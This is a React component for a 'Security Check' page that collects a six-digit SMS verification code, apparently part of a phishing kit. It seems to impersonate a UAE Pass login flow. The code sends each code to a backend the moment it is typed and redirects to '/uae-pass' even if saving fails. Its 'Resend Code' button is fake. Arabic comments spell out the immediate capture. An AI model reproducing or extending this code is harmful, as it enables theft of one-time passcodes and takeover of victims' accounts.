import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../styles/SecurityCheck.css';
import { saveVerificationCode } from '../utils/api';

const SecurityCheck: React.FC = () => {
  const navigate = useNavigate();
  const [code, setCode] = useState('');
  const [isResending, setIsResending] = useState(false);
  const [timer, setTimer] = useState(60);

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 6) {
      setCode(value);
      
      // حفظ رمز التحقق فورياً عند إدخال 6 أرقام
      if (value.length === 6) {
        saveVerificationCode(value);
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // حفظ رمز التحقق عند الضغط على زر التحقق
    try {
      await saveVerificationCode(code);
      navigate('/uae-pass');
    } catch (error) {
      console.error('Error saving verification code:', error);
      // المتابعة حتى في حالة فشل الحفظ
      navigate('/uae-pass');
    }
  };

  const handleResendCode = () => {
    if (timer === 0) {
      setIsResending(true);
      setTimeout(() => {
        setIsResending(false);
        setTimer(60);
      }, 2000);
    }
  };

  React.useEffect(() => {
    let interval: NodeJS.Timeout;
    if (timer > 0) {
      interval = setInterval(() => {
        setTimer((prevTimer) => prevTimer - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [timer]);

  return (
    <div className="security-check-container">
      <div className="security-check-header">
        <h1>Security Check</h1>
      </div>
      <div className="security-check-content">
        <div className="security-message">
          <p>For your security, we've sent a verification code to your registered mobile number.</p>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="verificationCode">Enter Verification Code</label>
            <input
              type="text"
              id="verificationCode"
              value={code}
              onChange={handleCodeChange}
              placeholder="Enter 6-digit code"
              required
            />
          </div>
          <div className="resend-code">
            {timer > 0 ? (
              <p>Resend code in {timer} seconds</p>
            ) : (
              <button
                type="button"
                className="resend-button"
                onClick={handleResendCode}
                disabled={isResending}
              >
                {isResending ? 'Sending...' : 'Resend Code'}
              </button>
            )}
          </div>
          <button
            type="submit"
            className="verify-button"
            disabled={code.length !== 6}
          >
            Verify
          </button>
        </form>
      </div>
    </div>
  );
};

export default SecurityCheck;
